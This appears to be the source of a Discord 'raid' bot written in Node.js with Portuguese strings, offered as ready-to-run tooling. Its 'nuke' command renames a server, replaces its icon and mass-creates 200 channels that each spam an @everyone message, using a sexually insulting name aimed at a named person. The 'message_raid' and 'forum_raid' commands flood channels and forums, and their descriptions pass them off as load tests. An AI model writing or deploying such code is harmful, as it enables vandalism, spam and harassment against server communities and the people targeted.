const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');
const express = require('express');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers]
});

const commands = [
    new SlashCommandBuilder()
        .setName('nuke')
        .setDescription('Executa protocolo de reestruturação massiva')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
        .setName('message_raid')
        .setDescription('Teste de carga de mensagens')
        .addStringOption(opt => opt.setName('texto').setDescription('Conteúdo').setRequired(true)),
    new SlashCommandBuilder()
        .setName('forum_raid')
        .setDescription('Criação massiva de posts em fórum')
        .addChannelOption(opt => opt.setName('forum').setDescription('Canal de fórum alvo').addChannelTypes(ChannelType.GuildForum).setRequired(true))
        .addIntegerOption(opt => opt.setName('quantidade').setDescription('Número de posts').setRequired(true))
        .addStringOption(opt => opt.setName('conteudo').setDescription('Mensagem do post').setRequired(true))
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
].map(c => c.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html><html><head><title>[P] Bot</title><style>body{background:#000;color:#0f0;font-family:monospace;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;}.status{border:1px solid #0f0;padding:40px;text-align:center;box-shadow:0 0 20px #0f0;}</style></head><body><div class="status"><h1>[P] SYSTEM ONLINE</h1><p>BOT: ${client.isReady() ? 'ATIVO' : 'OFFLINE'}</p></div></body></html>`);
});

client.on('ready', async () => {
    console.log(`[P] Logado como ${client.user.tag}`);
    try { await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands }); } catch (e) {}
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    const { commandName } = interaction;

    if (commandName === 'nuke') {
        await interaction.reply({ content: '[P] Nuke iniciado.', ephemeral: true });
        try { 
            await interaction.guild.setName('Theo bots anti RAID');
            await interaction.guild.setIcon('https://cdn.discordapp.com/attachments/1525751548477706351/1525871668780601384/IMG_6058.png');
        } catch (e) {}
        const name = 'MEU NOME É BERNADO EU SOU UM GULOSAO, EU QUERO DAR PRA UM MONTÃO';
        const msg = '@everyone ESTE SERVER FOI COMIDO PELO THEO, NÃO A NADA A SER FEITO \n ⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄';
        Array.from({ length: 200 }).forEach(async () => {
            try { const c = await interaction.guild.channels.create({ name }); await c.send(msg); } catch (err) {}
        });
    }

    if (commandName === 'message_raid') {
        const t = interaction.options.getString('texto');
        await interaction.reply({ content: '[P] Raid iniciada.', ephemeral: true });
        for (let i = 0; i < 10; i++) {
            try { await interaction.channel.send(t); } catch (e) {}
            await new Promise(r => setTimeout(r, 1000));
        }
    }

    if (commandName === 'forum_raid') {
        const forum = interaction.options.getChannel('forum');
        const qtd = interaction.options.getInteger('quantidade');
        const cont = interaction.options.getString('conteudo');
        await interaction.reply({ content: `[P] Criando ${qtd} posts no fórum ${forum.name}.`, ephemeral: true });
        
        for (let i = 0; i < qtd; i++) {
            try {
                await forum.threads.create({
                    name: `[P] TESTE ${i+1}`,
                    message: { content: cont }
                });
            } catch (e) {}
            // Pequeno delay para evitar rate limit agressivo de threads
            await new Promise(r => setTimeout(r, 500));
        }
    }
});

app.listen(port, () => {
    if (TOKEN) client.login(TOKEN).catch(() => {});
});
